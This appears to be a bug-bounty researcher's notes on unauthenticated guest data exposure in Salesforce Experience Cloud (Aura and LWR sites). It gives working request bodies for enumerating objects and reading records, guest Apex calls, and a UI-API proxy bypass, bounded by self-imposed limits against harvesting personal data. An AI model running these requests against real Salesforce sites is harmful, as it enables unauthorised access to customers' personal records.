# class: Salesforce Experience Cloud / Lightning (Aura) guest-access data exposure

**What:** Salesforce Experience Cloud / Community / Site (Lightning) instances expose an unauthenticated
**Aura endpoint**. When the *Guest User* profile has **"API Enabled"** + loose object/field permissions or
sharing rules, an unauthenticated visitor can enumerate and read backend SObjects (Contact, Case, Account,
User, Lead, custom `*__c`) directly through the Aura API. One of the most-paid, still-rife unauth classes.

**Why it matters now (2026):** ShinyHunters mass-exploited this Jan–Mar 2026 via a modified copy of Mandiant's
`AuraInspector` (released Jan 2026 to *detect* it). DIVD CSIRT case **DIVD-2026-00005**. Active, not theoretical.
Dup-resistant for us because it needs understanding of SF internals, not `subfinder|httpx|nuclei`.

## Fingerprint a host as a Salesforce Experience site
- Root page markers: `/s/sfsites/`, `siteforce`, `auraConfig`, `fwuid`, `communityUrlPathPrefix`, `aura.token`.
- Often **Cloudflare/Akamai-fronted**, so `tech:Salesforce` may be HIDDEN — the tell is the **path**:
  `/s/sfsites/aura`, `/webruntime/api/apex/execute?asGuest=...`, `/sfsites/`, `/s/`.
- Endpoint path variants: `/s/sfsites/aura`, `/aura`, `/sfsites/aura`, or custom prefix `/<prefix>/sfsites/aura`.

## SAFE confirm sequence (read-only, NO PII harvest — our hard line)
1. **Endpoint live (no data):** `POST` form `message={}&aura.token=undefined` to the aura path.
   Response containing `aura:invalidSession` (or a markup://aura framework error) = endpoint active + reachable unauth.
2. **Object enumeration (object NAMES only, not records):** POST a `message` with one action:
   ```
   {"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}
   ```
   Needs a valid `aura.context` (extract `fwuid` + `app` from the root page's inline `auraConfig` JSON; app is
   usually `siteforce:communityApp` or `siteforce:loginApp2`). Returns `apiNamesToKeyPrefixes` = the objects the
   **guest** can access. **Sensitive object in that list = CONFIRMED finding** (no record data pulled).
3. **Impact (bounded):** at most a `getItems` with `getCount:true` / `pageSize:1` on ONE object to show records
   exist and are guest-readable — then STOP. **NEVER** page/mass-dump (`pageSize` up to 1000) third-party PII.

## Record-dump descriptor (DO NOT mass-run — for understanding only)
```
{"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Case","layoutType":"FULL","pageSize":1,"currentPage":0,"getCount":true,"enableRowActions":false}}]}
```
Modern variant: the UI-API **GraphQL** controller was guest-default in some orgs (standardized record pull +
introspection). Same hard line applies.

## POST body params
- `message` = url-encoded JSON `{"actions":[...]}` (the action descriptor + params).
- `aura.token` = `undefined` → unauthenticated guest.
- `aura.context` = `{"mode":"PROD","fwuid":"<from page>","app":"siteforce:communityApp","loaded":{...},"dn":[],"globals":{},"uad":false}` (fwuid changes per SF release — must match the target's current fwuid or you get a framework-mismatch error; re-pull from the page).
- `aura.pageURI` = the community path, e.g. `/s/`.

## Hard line (recon vs attack)
Confirm the exposure exists (guest API enabled + sensitive object enumerable); do **NOT** harvest third-party
records. Enumeration + a count is the PoC. Honest severity: unauth sensitive-data exposure (often High/Critical
if PII objects are guest-readable; Medium if only low-value objects). Verify the object actually holds sensitive
data before claiming severity (an empty/low-value object accessible to guest is lower impact).

## Sources
- Aaron Costello / AppOmni (seminal 2020): https://appomni.com/ao-labs/lightning-components-a-treatise-on-apex-security-from-an-external-perspective/
- enumerated.ie (payloads): https://www.enumerated.ie/index/salesforce
- Mandiant AuraInspector / Google Cloud: https://cloud.google.com/blog/topics/threat-intelligence/auditing-salesforce-aura-data-exposure
- DIVD-2026-00005: https://csirt.divd.nl/cases/DIVD-2026-00005/
- moniik PoC: https://github.com/moniik/poc_salesforce_lightning

---

# LWR variant: Lightning Web Runtime communities (`/webruntime/...`) — added 2026-08-19

Newer Experience Cloud sites ship **LWR**, not classic Aura. The KB sequence above still applies in
spirit but **every path changes**, and the Aura probe alone will make you call a live guest surface dead.

## Fingerprint LWR (vs Aura)
- Root page has **no** `auraConfig` / `fwuid` / `sfsites` markers — grepping for those returns nothing.
- Network shows `/webruntime/framework/<hash>/prod/lwr_loader|lwr_bootstrap|lwr_app`,
  `/webruntime/view/<hash>/prod/<locale>/<name>_view`, `/webruntime/component/<hash>/prod/<locale>/...`.
- `window.LWR` exists (keys: `define`, `env`, `importMap`). `importMap` is often EMPTY — don't rely on it.
- `/s/sfsites/aura` and `/aura` may still answer **501 with a classic Visualforce Site page**
  (`/vforcesite/...`). That 501 is a FINDING-ADJACENT TELL: the org also runs a VF Site on the same
  hostname = a second, older guest surface (incl. `servlet/servlet.FileDownload`). Enumerate it separately.

## Guest Apex on LWR
```
POST /webruntime/api/apex/execute?language=<loc>&asGuest=true&htmlEncode=false
Content-Type: application/json
{"namespace":"","classname":"<Name>|@udd/<15-char ApexClassId>","method":"<m>",
 "isContinuation":false,"params":{...},"cacheable":false}
```
- `classname` accepts a **plain name** (with `namespace`) *or* `@udd/01p…` (ApexClass durable id).
- Unknown/недоступный class ⇒ `400 {"error":[{"message":"The Apex request is invalid."}]}` — use as the
  negative control. A GET form also exists with `classname=`/`method=`/`namespace=` query params.
- **Enumerate the guest-invocable set from the app's own `_view`/`_cmp` modules** (grep `@udd/`,
  `@salesforce/apex/`, `classname`). Deterministic — do NOT brute-force class names (that is a scanner,
  it is what the crowd does, and many programs ban it).

## The UI-API proxy differential — the part worth knowing
Guest profiles usually lack "API Enabled", which is *supposed* to close the REST/UI API. Test BOTH paths:

| path | typical guest result |
|---|---|
| `/services/data/v<XX.X>/ui-api/object-info/Case` | `403 API_DISABLED_FOR_ORG` ("Chatter Connect API is not enabled…") = the intended lock |
| `/webruntime/api/services/data/v<XX.X>/ui-api/object-info/Case` | `403 INSUFFICIENT_ACCESS` = **routed past the org/API gate**; only per-object ACL remains |

Two *different* errors ⇒ the `/webruntime/api/...` proxy reaches the UI API under the community guest
context. That is the interesting state: the org-wide switch is no longer protecting you, so **whatever
the guest profile can see is now reachable**.

Recover the **full UI-API route table for free** from the loaded LDS engine
(`/webruntime/component/<hash>/prod/<loc>/force/ldsEngineWebruntime_cmp`, ~330KB) — grep `ui-api/`.
Yields `records/{id}`, `records/batch/{ids}`, `list-records/...`, `related-list-count/...`,
`search/results`, `object-info/...`, `aggregate-ui`, etc.

## Safe object sweep (metadata only)
`GET /webruntime/api/services/data/v<XX.X>/ui-api/object-info/<Object>` per object, ~1s apart.
200 = guest-visible object, and the body gives `queryable`, `createable`, and the full field list.
Real-world result on a SEEK help community: `Case`/`Contact`/`Account`/`Lead` = 403 (locked),
`Knowledge__kav` = 200 (by design for a help centre), `User` (215 fields) / `ContentDocument` /
`Organization` = 200.

## ⚠ DO NOT REPORT `object-info` ALONE — chain-to-impact
`object-info` returns **metadata**. Guest read on `User`/`Organization` metadata is COMMON BY DESIGN in
Experience Cloud (the community renders Knowledge-article authors). "An endpoint returned metadata" is
the discovery half and is a dup/Info at best. **The finding is a RECORD.** Escalate in this order and
stop at the first proof:
1. `ui-api/records/<orgId>` — the **Organisation's own record** is the right first pull: it proves
   record-level guest read while being **non-personal** (no third party's data touched).
2. `related-list-count/...` or a `pageSize:1` / `getCount:true` list call — proves records EXIST.
3. **STOP.** Never page or mass-dump `User`/`ContentDocument`/custom objects — that is third-party PII
   and it is the hard line, not a style preference.

Honest severity: guest-readable **records** on a PII object = High/Critical; guest-readable metadata
only = not reportable; low-value object with records = Low/Medium. Verify what the object actually
holds before claiming anything.
